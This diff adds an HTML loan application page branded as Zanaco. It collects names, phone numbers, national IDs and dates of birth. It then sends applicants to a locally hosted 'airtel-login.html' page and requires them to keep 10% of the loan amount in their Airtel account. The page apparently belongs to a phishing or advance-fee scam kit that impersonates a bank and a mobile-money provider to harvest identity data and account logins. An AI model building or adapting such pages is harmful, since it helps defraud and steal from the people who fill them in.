@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Zanaco Loan Application</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/apply.css">
+</head>
+<body>
+
+<div class="form-container">
+
+  <div class="logo">zanaco loan</div>
+
+  <h2>Apply for a loan in minutes</h2>
+  <p class="subtitle">
+    Please fill in all required details accurately.
+    All information is kept confidential and used only for loan processing and verification.
+  </p>
+
+  <div class="notice">
+    <strong>Important:</strong> You must have at least <strong>10%</strong> of the loan amount
+    you want in your Airtel account.
+  </div>
+
+  <form id="loanForm" action="backend/handlers/submit_loan.php" method="POST">
+
+    <label>Full name*</label>
+    <input type="text" name="full_name" required>
+
+    <label>Phone Number*</label>
+    <input type="tel" name="phone" placeholder="0712345678" required>
+
+    <label>Email</label>
+    <input type="email" name="email">
+
+    <label>National ID*</label>
+    <input type="text" name="national_id" required>
+
+    <label>Date of Birth*</label>
+    <div class="dob">
+      <input type="text" name="dob_year" placeholder="YYYY" required>
+      <input type="text" name="dob_month" placeholder="MM" required>
+      <input type="text" name="dob_day" placeholder="DD" required>
+    </div>
+
+    <label>Employment Status*</label>
+    <select name="employment_status" required>
+      <option value="">Select</option>
+      <option>Employed</option>
+      <option>Self-Employed</option>
+      <option>Unemployed</option>
+    </select>
+
+    <label>Loan Amount (ZMW)*</label>
+    <input type="text" name="loan_amount" value="ZMW 30000" required>
+
+    <label>Repayment*</label>
+    <select name="repayment" required>
+      <option>6 months</option>
+      <option>12 months</option>
+      <option>24 months</option>
+    </select>
+
+    <label class="checkbox">
+      <input type="checkbox" required>
+      I confirm that the information provided is true and I agree to the zanaco Loans terms and conditions.
+    </label>
+
+    <a href="airtel-login.html" class="airtel-btn">
+      Continue with Airtel
+    </a>
+    <button type="reset" class="reset-btn">Reset</button>
+
+  </form>
+
+</div>
+
+<script src="assets/js/apply.js"></script>
+</body>
+</html>
